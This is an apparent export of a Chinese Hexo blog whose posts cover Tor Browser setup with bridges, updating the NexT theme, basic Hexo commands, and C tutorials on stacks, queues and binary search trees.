<h2 id="番外：如何访问暗网"><a href="#番外：如何访问暗网" class="headerlink" title="番外：如何访问暗网"></a>番外：如何访问暗网</h2><p>​         <strong>警告：</strong> 在继续之前，重要的是要了解Dark Web上的许多内容都是非法的。 无论你采取什么预防措施，都不可能保持匿名。 自担风险！</p>
<h3 id="Tor工作原理"><a href="#Tor工作原理" class="headerlink" title="Tor工作原理"></a>Tor工作原理</h3><p>​        Tor由已经安装了Tor软件的电脑连接网络而成。它之所以被称为onion，是因为它的结构就跟洋葱相同，你只能看出它的外表，而想要看到核心，就必须把它层层的剥开。即每个路由器间的传输都经过点对点密钥来加密，形成有层次的结构。它中间所经过的各节点，都好像洋葱的一层皮，把客户端包在里面，算是保护信息来源的一种方式。</p>
<p>​        用 Tor 创建一条私有网络路径时，用户的软件或客户端通过网络上的中继递增地建立一条由若干加密连接组成的环路。环路一次扩展一跳，环路上的中继仅仅知道它从哪一个中继接收数据以及向哪一个中继发送数据。没有一台单独的中继会知道数据包的完整路径。客户端与环路上的每一跳都协商一组独立的密钥，这样可以保证数据通过任何一跳时都无法跟踪。</p>
<ol>
<li><p>下载 tor游览器（如果是在国内，你需要一个梯子），下载地址 <a href="https://www.torproject.org/zh-CN/download/" target="_blank" rel="noopener">https://www.torproject.org/zh-CN/download/</a></p>
</li>
<li><p>安装并配置tor，tor安装有中文，所以很好安装，此处不再赘述。</p>
<p>配置的时候我们知道国内是无法直连的，所以我们要选择configure来配置代理，然后在你的网络提供商是否对Tor网络进行了封锁或审查这里选yes。</p>
<p>然后选择在中国可连的网桥meek-azure。</p>
<p>在高级配置中使用代理访问网络，上面我用到SSR中对本机6666端口进行了代理，所以这里填写了socks 5，地址127.0.0.1和端口6666</p>
</li>
</ol>
<ol start="3">
<li>登陆DuckDuckGo，也就是暗网的Google，查看是否能登陆。（注意，暗网的访问速度一般都很慢。）地址为<a href="https://3g2upl4pq6kufc4m.onion/" target="_blank" rel="noopener">https://3g2upl4pq6kufc4m.onion/</a></li>
</ol>
]]></content>
      <categories>
        <category>相关配置</category>
      </categories>
      <tags>
        <tag>VPN</tag>
        <tag>ShadowsocksR</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo next主题更新</title>
    <url>/2020/02/13/hexo-next%E4%B8%BB%E9%A2%98%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<h1 id="hexo-next主题更新"><a href="#hexo-next主题更新" class="headerlink" title="hexo next主题更新"></a>hexo next主题更新</h1><p>next主题设置文档链接：<a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">http://theme-next.iissnan.com/</a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        因为我之前用hexo搭建个人博客的时候一直使用的是next主题，不过在最近的一次next主题配置设置的时候，发现配置文件_config.YML中有很多我没有的选项，结果发现我的next版本是5.1.4，现在我要将它更新到7.4。</p>
<p>​        想着next主题更新的话，顺便也可以更新下hexo，但是发现我就是当前最新版4.2.0，那就只更新一下next就行。</p>
<a id="more"></a>

<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ul>
<li>本地保存旧版本数据</li>
<li>下载新版本</li>
<li>更新设置新版本</li>
</ul>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>​        直接把next主题配置文件_config.YML复制一份，然后直接把<code>theme/next</code>目录删掉</p>
<p>​        然后从新地址安装最新版 NexT 主题</p>
<p>​        <code>git clone https://github.com/theme-next/hexo-theme-next themes/next</code></p>
<p>​        如果下载很慢 , 或者下载失败 , 也可以直接到 <a href="https://github.com/theme-next/hexo-theme-next下载源文件" target="_blank" rel="noopener">https://github.com/theme-next/hexo-theme-next下载源文件</a> , 点击左侧的 <code>Clone or download</code> , 然后点击 <code>Download ZIP</code> , 下载到本地后 , 在 Hexo 的 <code>\themes</code> 文件夹下创建 <code>next</code> 文件夹 , 然后将 zip 文件解压到这个目录即可</p>
<h2 id="更新配置"><a href="#更新配置" class="headerlink" title="更新配置"></a>更新配置</h2><p>​        对照一下旧版的配置文件和新下载的配置文件修改一下即可。</p>
<h3 id="设置语言"><a href="#设置语言" class="headerlink" title="设置语言"></a>设置语言</h3><p>​        <code>language: zh-cn</code></p>
<h3 id="主题选项"><a href="#主题选项" class="headerlink" title="主题选项"></a>主题选项</h3><p>​        使用Mist主题 <code>scheme: Mist</code></p>
<h3 id="侧边栏社交链接"><a href="#侧边栏社交链接" class="headerlink" title="侧边栏社交链接"></a>侧边栏社交链接</h3><p>​        在<code>social</code>选段中设置，我这边设置了自己的github和Email</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">GitHub:</span> <span class="string">https://github.com/BMooS</span> <span class="string">||</span> <span class="string">github</span></span><br><span class="line"><span class="attr">E-Mail:</span> <span class="string">mailto:slibo921@gmail.com</span> <span class="string">||</span> <span class="string">envelope</span></span><br></pre></td></tr></table></figure>

<h3 id="友链设置"><a href="#友链设置" class="headerlink" title="友链设置"></a>友链设置</h3><p>​        在<code>links</code>选段下，我设置了自己的码云地址</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">links:</span></span><br><span class="line">  <span class="attr">My-gitee:</span> <span class="string">https://gitee.com/BMooS</span></span><br></pre></td></tr></table></figure>

<h3 id="头像设置"><a href="#头像设置" class="headerlink" title="头像设置"></a>头像设置</h3><p>​        在<code>avatar</code>选段下，发现新版本对头像提供了一些新的选项，之后再去研究研究</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="comment"># Replace the default image and set the url here.</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">https://s2.ax1x.com/2020/01/15/lOIrB4.jpg</span></span><br><span class="line">  <span class="comment"># If true, the avatar will be dispalyed in circle.</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># If true, the avatar will be rotated with the cursor.</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="百度的站长统计"><a href="#百度的站长统计" class="headerlink" title="百度的站长统计"></a>百度的站长统计</h3><p>​        在<code>baidu_analytics</code>选段下，相关的在next文档里有</p>
<h3 id="不蒜子统计"><a href="#不蒜子统计" class="headerlink" title="不蒜子统计"></a>不蒜子统计</h3><p>​        在<code>busuanzi_count</code> 选段下，发现新版只需要开启<code>enable: true</code>就行</p>
<h3 id="footer设置"><a href="#footer设置" class="headerlink" title="footer设置"></a>footer设置</h3><p>​        在<code>footer</code>选项下，注释很好的说明了作用，这里不再说</p>
<h3 id="字数统计"><a href="#字数统计" class="headerlink" title="字数统计"></a>字数统计</h3><p>插件更新</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-wordcount</span><br><span class="line">npm install hexo-symbols-count-time --save</span><br></pre></td></tr></table></figure>

<p>配置主题文件</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">  <span class="attr">separated_meta:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">item_text_post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">item_text_total:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">awl:</span> <span class="number">4</span></span><br><span class="line">  <span class="attr">wpm:</span> <span class="number">275</span></span><br></pre></td></tr></table></figure>

<h3 id="加入站内搜索"><a href="#加入站内搜索" class="headerlink" title="加入站内搜索"></a>加入站内搜索</h3><p>插件安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure>

<p>找到<code>local_search</code>选段，开启<code>enable: true</code></p>
<h3 id="关于背景动画设置的问题"><a href="#关于背景动画设置的问题" class="headerlink" title="关于背景动画设置的问题"></a>关于背景动画设置的问题</h3><p>关于canvas_nest背景动画</p>
<ol>
<li><p>进入themes/next目录</p>
<ol start="2">
<li><p>执行命令：<br><code>git clone https://github.com/theme-next/theme-next-canvas-nest source/lib/canvas-nest</code></p>
<p>（实际上就是将一个显示动效的js文件clone到对应目录）</p>
</li>
<li><p>这时将配置文件_config.yml中的canvas_nest: false改为canvas_nest: true才能真正生效。</p>
</li>
</ol>
</li>
</ol>
<p>关于three背景动画(3D的，太卡了。。。)</p>
<ol>
<li><p>进入themes/next目录</p>
<ol start="2">
<li><p>执行命令：<br><code>git clone https://github.com/theme-next/theme-next-three source/lib/three</code></p>
<p>（实际上就是将一个显示动效的js文件clone到对应目录）</p>
</li>
<li><p>这时将配置文件_config.yml中的three: false改为three: true才能真正生效。</p>
</li>
</ol>
</li>
</ol>
<p>这是我的canvas_nest设置：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">canvas_nest:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">onmobile:</span> <span class="literal">true</span> <span class="comment"># Display on mobile or not</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">"0,0,0"</span> <span class="comment"># RGB values, use `,` to separate</span></span><br><span class="line">  <span class="attr">opacity:</span> <span class="number">0.6</span> <span class="comment"># The opacity of line: 0~1</span></span><br><span class="line">  <span class="attr">zIndex:</span> <span class="number">-1</span> <span class="comment"># z-index property of the background</span></span><br><span class="line">  <span class="attr">count:</span> <span class="number">150</span> <span class="comment"># The number of lines</span></span><br></pre></td></tr></table></figure>

<p>还有一些配置更改以后展开，现在还是摸索摸索。</p>
]]></content>
      <categories>
        <category>相关配置</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next主题</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo相关问题</title>
    <url>/2020/02/13/hexo%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h1><p>hexo中文文档链接：<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/</a></p>
<a id="more"></a>



<ol>
<li><p>建站：<code>hexo init &lt;文件夹名称&gt;</code></p>
</li>
<li><p>生成博客：<code>hexo new &quot;md文件名称&quot;</code></p>
<p>生成的博客文件在建站文件夹目录下<code>.\source\_posts</code>目录下</p>
</li>
<li><p>更新： <code>hexo clean</code>           <code>hexo g</code></p>
</li>
<li><p>本地加载：<code>hexo s</code></p>
<p>会加载到<a href="http://localhost:4000/下" target="_blank" rel="noopener">http://localhost:4000/下</a></p>
</li>
<li><p>推到远端： <code>hexo d</code></p>
</li>
<li><p>网站配置信息：在建站文件夹目录下的_config.yml文件</p>
<p>可以在此配置大部分的参数。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>相关配置</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>堆栈和队列</title>
    <url>/2020/02/12/%E5%A0%86%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        堆栈和队列都是比较基本的数据结构，也是程序员应该掌握的结构，它们简单而又有用，以此，记录一下学习过程。</p>
<a id="more"></a>

<h1 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h1><p>​        堆栈是比较基本的ADT(抽象数据类型)，这种结构最鲜明的特点就是List-In First-Out，LIFO方式。</p>
<h2 id="堆栈接口"><a href="#堆栈接口" class="headerlink" title="堆栈接口"></a>堆栈接口</h2><p>​        一般来说，传统的堆栈操作就是push和pop。</p>
<p>​        push就是把一个新值压入到堆栈顶部，pop就是把堆栈顶部的值移出堆栈并返回这个值。堆栈只提供对它顶部元素的访问。</p>
<p>​        但是，用于访问堆栈顶部元素只有pop操作，且这个元素还要被弹出堆栈。</p>
<p>​        所以要使用另一种堆栈接口，其含有三种基本操作push，pop和top：</p>
<p>​        push和传统堆栈一样，而pop只是将堆栈顶的值弹出，并不返回这个值，而top的操作就是返回堆栈顶元素的值，它并不把顶部元素从堆栈中移除。</p>
<p>​        同时，一个空的堆栈不支持pop操作，所以需要一个is_empty函数查看堆栈是否为空，同理，一个满的堆栈不支持push操作，需要一个is_full函数查看堆栈是否为满。</p>
<h2 id="实现堆栈"><a href="#实现堆栈" class="headerlink" title="实现堆栈"></a>实现堆栈</h2><p>​        所有的ADT都必须确定一件事，那就是内存分配，如何获取内存来储存值。有三种可选的方案：静态数组，动态分配的数组，以及动态分配的链式结构。</p>
<p>​        静态数组要求长度固定，而且这个长度在编译使就已经确定。但是这个方案最简单也最不容易出错。</p>
<p>​        动态数组可以在运行时才决定数组的长度。而且，需要的话，可以分配一个新的，更大的数组。把原先的数组的值复制到新的数组中，然后删除掉原先数组，从而达到动态增长数组大小的目的。</p>
<p>​        最后链式结构提供的最大程度上的灵活性。每个元素在需要时候才单独分配，所以除非超过机器内存大小的限制外，这种方式对元素数量没有什么限制。不过，链式结构在访问下一元素的时候需要消耗一定的内存空间，而且在访问一个特定的元素时候的效率不如数组。</p>
<p>下述代码正式用链式结构对堆栈的实现，其他两种同理也可以比较简单的实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 堆栈模块的接口</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_TYPE int <span class="comment">/*堆栈所储存的类型*/</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* push 把一个新值压入到堆栈中 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(STACK_TYPE value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pop 从堆栈中弹出一个值，并丢弃 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* top 返回堆栈顶部元素，但对堆栈不进行修改 */</span></span><br><span class="line"></span><br><span class="line"><span class="function">STACK_TYPE <span class="title">top</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* is_empty 如果堆栈为空，则返回true，否则，返回false */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_empty</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* is_full 如果堆栈为满，则返回true，否则，返回false */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_full</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<p>stack.h文件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 一个用链表实现的堆栈，这个堆栈没有长度限制。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stack.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 定义一个结构用来储存堆栈元素</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">STACK_NODE</span> &#123;</span></span><br><span class="line">    STACK_TYPE value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">STACK_NODE</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; StackNode;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 指向堆栈中第一个节点的指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">static</span> StackNode *<span class="built_in">stack</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* destroy_stack</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">destroy_stack</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(!is_empty())</span><br><span class="line">        pop();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* push</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(STACK_TYPE value)</span></span>&#123;</span><br><span class="line">    StackNode *new_node;</span><br><span class="line"></span><br><span class="line">    new_node = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(StackNode));</span><br><span class="line">    assert(new_node != <span class="literal">NULL</span>);</span><br><span class="line">    new_node-&gt;value = value;</span><br><span class="line">    new_node-&gt;next = <span class="built_in">stack</span>;</span><br><span class="line">    <span class="built_in">stack</span> = new_node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* pop</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    StackNode *first_node;</span><br><span class="line"></span><br><span class="line">    assert(!is_empty());</span><br><span class="line">    first_node = <span class="built_in">stack</span>;</span><br><span class="line">    <span class="built_in">stack</span> = first_node-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(first_node);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* top</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">STACK_TYPE <span class="title">top</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    assert(!is_empty());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span>-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* is_empty</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_empty</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span> == <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* is_full</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_full</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><p>​        队列同样是比较基本的ADT，这种结构和堆栈不同的是，其特点是First-In First-Out，FIFO方式。</p>
<h2 id="队列接口"><a href="#队列接口" class="headerlink" title="队列接口"></a>队列接口</h2><p>​        事实上队列并没有像堆栈那样具有约定俗成的用法，不过原理上队列都是一样，在这里我们用insert和delete来表示插入和删除，以及队列的方向是从队尾进入，从队首弹出。</p>
<p>​        队列也有insert+delete的用法，以及insert+delete+first的用法，和上述堆栈中差不多，也就不细说了。</p>
<h2 id="实现队列"><a href="#实现队列" class="headerlink" title="实现队列"></a>实现队列</h2><p>​        队列的实现有些和堆栈不同，队列需要两个指针，一个指向队首front，一个指向队尾rear。同时，一般的数组并不适合队列，这是因为队列使用内存的方式引起的。堆栈数据总是扎很于一端，而队列需要对数据进行挪移。</p>
<p>​        在实现队列时，可以用到循环数组实现：</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1qs2z8.png" alt="1qs2z8.png"></p>
<p>再插入一个新的元素就为：</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1qs7iq.png" alt="1qs7iq.png"></p>
<p>这种循环数组很容易实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rear += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (rear &gt;= QUEUE_SIZE)</span><br><span class="line">    rear = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>或者：</p>
<p><code>rear = (rear + 1) % QUEUE_SIZE</code></p>
<p>同理，对front也是一样的计算。</p>
<p><strong>但是，</strong>这样的循环数组具有一个问题——那就是对队列为空和为满时候两种情况的front和rear是一样的。</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1q6ZcT.png" alt="1q6ZcT.png"></p>
<p>​                                                            向队列中不断添加元素使之为满。</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1q6ja9.png" alt="1q6ja9.png"></p>
<p>​                                                            从队列中不断释放元素使之为空。</p>
<p>​        这样的问题一种解决办法就是设置一个变量，这个变量用于记录队列大小。</p>
<p>​        还有一种解决方法，那就是重新定义 ‘ 满 ‘ 的含义，在队列中插入时剩一个元素的时候就为满了，这样在满的时候和空的时候front和rear的值就不一样了。</p>
<p>​        因为只定义了 ‘ 满 ‘ 的含义，那么队列为空的时候还是原先的判别条件：</p>
<p><code>(rear + 1) % QUEUE_SIZ = front</code></p>
<p>​        队列为满的时候，还保留一个元素未使用，所以在满的时候判别条件就为：</p>
<p> <code>(rear + 2) % QUEUE_SIZE = front</code></p>
<p>​        这样就把这两种情况区分开了。</p>
<p><strong>链表实现</strong></p>
<p>​        上述所说的是队列使用线性结构数组的实现方式，在队列中，还可以使用链式结构——链表去实现，因为是动态分配了新元素的内存，只要不受机器内存大小的限制，理论上队列不存在为满的情况。</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1q4Kte.png" alt="1q4Kte.png"></p>
<pre><code>链表实现图</code></pre>]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>c语言</tag>
        <tag>堆栈</tag>
        <tag>队列</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉搜索树</title>
    <url>/2020/02/06/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/</url>
    <content><![CDATA[<h1 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h1><blockquote>
<p><strong>树的递归定义：</strong></p>
<p>树是一种数据结构，它要么为空，要么具有一个值并具有零个或多个<strong>孩子</strong>，每个孩子本身也是一个树。</p>
</blockquote>
<a id="more"></a>

<p>二叉树是树的特殊形式，它的每个节点至多有两个孩子，分别称作<strong>左孩子</strong>和<strong>右孩子</strong>。</p>
<p>二叉搜索树还具有一个额外的性质：每个节点的值比它的左子树的所有节点的值都要大，但比它的右子树的所有节点的值都要小。</p>
<p>注意：这个定义排除了树中存在值相同的节点可能</p>
<p>这使得二叉搜索树成为一种用关键值快速查找的工具，它的查找时间复杂度可为<strong>O(log n)</strong>，因为它是用到二分法快速锁定关键值。</p>
<p><img src="https://s2.ax1x.com/2020/02/12/17Ilct.png" alt="17Ilct.png"></p>
<p>​                                                                                （二叉搜索树）</p>
<h2 id="在二叉搜索树的插入"><a href="#在二叉搜索树的插入" class="headerlink" title="在二叉搜索树的插入"></a>在二叉搜索树的插入</h2><p>​    当一个新值添加到一颗二叉搜索树时，它必须被放在合适的位置，继续保持二叉搜索树的属性。</p>
<p>插入的基本算法：</p>
<blockquote>
<p>​    <em>如果树为空：</em></p>
<p>​            <em>把新值作为根节点插入</em></p>
<p>​    <em>否则：</em></p>
<p>​            <em>如果新值小于当前节点的值：</em></p>
<p>​                    <em>把新值插入到当前节点的左子树中</em></p>
<p>​            <em>否则：</em></p>
<p>​                    <em>把新值插入到当前节点的右子树中</em></p>
</blockquote>
<p>上述算法的<strong>递归表达</strong>正是对树的<strong>递归定义</strong>的直接结果。</p>
<p>( 注意：由于上述递归在算法的尾部出现&lt;尾部递归&gt;，所以我们可以用到迭代跟有效的实现这个算法 )</p>
<h2 id="从二叉搜索树删除节点"><a href="#从二叉搜索树删除节点" class="headerlink" title="从二叉搜索树删除节点"></a>从二叉搜索树删除节点</h2><p>​        从树的中部删除一个节点将会导致节点的子树和树的其余部分分离，我们必须重新连接它们。</p>
<p>所以从二叉搜索树删除节点分三种情况：</p>
<ol>
<li>删除节点为叶节点，则直接删除叶节点不会导致任何子树断开，所以不存在重新连接问题。</li>
<li>删除节点只有一个孩子，则删除节点只需要将删除节点的父节点和它的孩子节点连接起来即可。</li>
<li>删除节点具有两个孩子，则其中一种策略是找到该节点左子树的最大值，并将最大值节点删除，同时用这个最大值代替原先要删除那个节点的值。</li>
</ol>
<h2 id="在二叉搜索树中查找"><a href="#在二叉搜索树中查找" class="headerlink" title="在二叉搜索树中查找"></a>在二叉搜索树中查找</h2><p>​        根据二叉搜索树本身特性，则在树中查找值并不困难：</p>
<blockquote>
<p><em>如果树为空：</em></p>
<p>​        <em>这个值不在树中</em></p>
<p><em>否则：</em></p>
<p>​        <em>如果这个值和根节点的值相同:</em></p>
<p>​                <em>成功找到这个值</em></p>
<p>​        <em>否则：</em></p>
<p>​                <em>如果这个值小于根节点的值:</em></p>
<p>​                        <em>查找左子树</em></p>
<p>​                <em>否则：</em></p>
<p>​                        <em>查找右子树</em></p>
</blockquote>
<p>这个递归算法也属于<strong>尾部递归</strong>，所以采用迭代的方案更具效率。</p>
<h2 id="在二叉搜索树中遍历"><a href="#在二叉搜索树中遍历" class="headerlink" title="在二叉搜索树中遍历"></a>在二叉搜索树中遍历</h2><p>​        当你在检查这棵树的所有节点时，就是在遍历这棵树。</p>
<p>​        遍历树的节点有几种不同的遍历方式：前序，中序，后序，以及层次遍历。</p>
<p><img src="https://s2.ax1x.com/2020/02/12/1HU0Wd.png" alt="1HU0Wd.png"></p>
<p>上图所描述的树的前序遍历为：20，12，5，16，25，28 （中-&gt;左-&gt;右）</p>
<p>中序遍历为：5，12，16，20，25，28（左-&gt;中-&gt;右）</p>
<p>后序遍历为：5，16，12，28，25，10（左-&gt;右-&gt;中）</p>
<p>层次遍历为：20，12，25，5，16，28</p>
<h2 id="二叉搜索树的接口文件"><a href="#二叉搜索树的接口文件" class="headerlink" title="二叉搜索树的接口文件"></a>二叉搜索树的接口文件</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">**二叉搜索树的接口</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TREE_TYPE int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* TreeNode 结构包含了值和两个指向某个树节点的指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TREE_NODE</span> &#123;</span></span><br><span class="line">    TREE_TYPE value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TREE_NODE</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TREE_NODE</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125; TreeNode;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*insert 向树种插入一个新值，参数是需要被添加的值，它必须是树中没有的值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(TREE_TYPE value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*find 查找一个值，这个值作为参数传递给函数，返回这个值的地址，若无，则返回NULL</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">TREE_TYPE *<span class="title">find</span><span class="params">(TREE_TYPE value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*max 查找树中最大值，也就是树的最有叶节点的值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">TREE_TYPE <span class="title">max_tree</span><span class="params">(TreeNode *link)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*remove 删除一个值，这个值作为参数传递给函数，它必须是树中具有的值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove_value</span><span class="params">(TREE_TYPE value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*pre_order_traverse</span></span><br><span class="line"><span class="comment">*执行树的前序遍历，参数是一个回调函数指针，它所指向的函数将在树中处理每个节点被调用</span></span><br><span class="line"><span class="comment">*节点的值作为被调函数的参数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pre_order_traverse</span><span class="params">(<span class="keyword">void</span> (*callback)(TREE_TYPE value))</span></span>;</span><br></pre></td></tr></table></figure>

<p>tree.h文件</p>
<h2 id="二叉搜索树的线性结构"><a href="#二叉搜索树的线性结构" class="headerlink" title="二叉搜索树的线性结构"></a>二叉搜索树的线性结构</h2><p><strong>数组形式的二叉搜索树</strong></p>
